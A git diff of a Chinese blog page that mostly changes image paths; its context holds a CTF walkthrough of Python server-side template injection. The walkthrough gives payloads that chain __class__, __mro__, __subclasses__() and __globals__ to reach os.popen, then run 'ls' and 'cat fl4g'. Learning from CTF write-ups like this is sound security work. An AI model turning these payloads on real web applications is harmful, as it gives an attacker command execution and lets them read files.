@@ -245,7 +245,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -439,33 +439,33 @@ __init__  类的初始化方法
 __globals__  对包含函数全局变量的字典的引用</code></pre><h3 id="class"><a href="#class" class="headerlink" title="_class_"></a>_<em>class_</em></h3><p>返回类型所属的对象，就是返回当前数据实例化的类是什么，举几个例子：</p>
 <p><img src="/img/ssti_class_eg.png" alt=""></p>
 <h3 id="bases-及-mro"><a href="#bases-及-mro" class="headerlink" title="_bases__及__mro_\"></a>_<em>bases__及__mro_\</em></h3><p>两者类似，都是获得该类的基类，例子如下：</p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_base_eg.png" alt=""></p>
+<p><img src="/img/ssti_base_eg.png" alt=""></p>
 <p>不同的是，__mro__会将本类包含，而___bases__不会将本类包含进去</p>
 <h3 id="subclasses"><a href="#subclasses" class="headerlink" title="_subclasses_()"></a>_<em>subclasses_</em>()</h3><p>查看类中所有存活子类的引用，也就是返回这个类的子类的集合，也就是object类的子类的集合。这里顺便说一下，python2返回的子类和python3是不同的，但python2有的python3也基本都有。</p>
 <h2 id="xctf-web-python-template-injection"><a href="#xctf-web-python-template-injection" class="headerlink" title="xctf_web_python_template_injection"></a>xctf_web_python_template_injection</h2><p>这里就用攻防世界的一个题来作为例子分析一下</p>
 <h3 id="测试是否存在ssti漏洞"><a href="#测试是否存在ssti漏洞" class="headerlink" title="测试是否存在ssti漏洞"></a>测试是否存在ssti漏洞</h3><p>根据题目猜测是一个ssti模板注入漏洞，经过测试发现输入的7*7被执行了，确实存在ssti注入漏洞。</p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5CQQ%E6%88%AA%E5%9B%BE20200911175112.png" alt=""></p>
+<p><img src="/img/QQ%E6%88%AA%E5%9B%BE20200911175112.png" alt=""></p>
 <h3 id="查看类型对象"><a href="#查看类型对象" class="headerlink" title="查看类型对象"></a>查看类型对象</h3><p>接着__class__查看返回的类型的对象</p>
 <p><code>&#39;&#39;.__class__</code></p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_class.png" alt=""></p>
+<p><img src="/img/ssti_class.png" alt=""></p>
 <h3 id="获取object基类"><a href="#获取object基类" class="headerlink" title="获取object基类"></a>获取object基类</h3><p>这里我用的是__mro__这个魔术方法</p>
 <p><code>‘’.__class__.__mro__</code></p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_mro.png" alt=""></p>
+<p><img src="/img/ssti_mro.png" alt=""></p>
 <p>我们可以看到我们要查找的object类对应的索引是2，那么对应的payload就应该是</p>
 <p><code>‘’.__class__.__mro__[2]</code></p>
 <h3 id="获取基类的所有子类"><a href="#获取基类的所有子类" class="headerlink" title="获取基类的所有子类"></a>获取基类的所有子类</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()</code></p>
 <p>这部分是去寻找一个可以执行命令或者读取文件的类，_<em>subclasses_</em>()返回该类的所有子类。</p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_subclasses.png" alt=""></p>
+<p><img src="/img/ssti_subclasses.png" alt=""></p>
 <p>我们现在就是要去寻找可以执行命令或者读取文件的类，由于类的数量太多，可以考虑使用脚本来进行判断。这里找的是site._Printer类，是第72个类(所以索引应该是71)</p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_subclasses_71.png" alt=""></p>
+<p><img src="/img/ssti_subclasses_71.png" alt=""></p>
 <h3 id="查看读取文件"><a href="#查看读取文件" class="headerlink" title="查看读取文件"></a>查看读取文件</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;ls&#39;).read()</code></p>
 <p>我们可以利用<code>.__init__.__globals__</code>来查找os类下的，<code>__init__</code>初始化类，<code>__globals__</code>全局查找所有的方法、变量、参数。</p>
 <p>在我们全局查找所有的方法时，找到一个可以利用的function popen（这里我利用的是os模块中的popen执行ls来打印所有文件，还有其他很多方法来读取文件，详情可以自行百度）</p>
 <p>发现我们要找的flag文件</p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_ls.png" alt=""></p>
+<p><img src="/img/ssti_ls.png" alt=""></p>
 <p>将ls命令换成cat命令，即可读取到文件内容</p>
 <p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;cat fl4g&#39;).read()</code></p>
-<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_cat.png" alt=""></p>
+<p><img src="/img/ssti_cat.png" alt=""></p>
 <p>该题还有其他的payload，原理都一样。</p>
 <p>参考文章:<a href="https://www.xav1er.top/index.php/archives/20/" target="_blank" rel="noopener">https://www.xav1er.top/index.php/archives/20/</a></p>
 <p>​                <a href="https://www.ebounce.cn/web/19.html" target="_blank" rel="noopener">https://www.ebounce.cn/web/19.html</a></p>
@@ -588,8 +588,7 @@ __globals__  对包含函数全局变量的字典的引用</code></pre><h3 id="c
                 <a href="/2020/09/11/ssti%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ssti模板注入漏洞">
+                        <img src="/img/1.jpg" class="responsive-img" alt="ssti模板注入漏洞">
                         
                         <span class="card-title">ssti模板注入漏洞</span>
                     </div>
@@ -642,8 +641,7 @@ __globals__  对包含函数全局变量的字典的引用</code></pre><h3 id="c
                 <a href="/2020/09/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="文件上传漏洞">
+                        <img src="/img/13.jpg" class="responsive-img" alt="文件上传漏洞">
                         
                         <span class="card-title">文件上传漏洞</span>
                     </div>
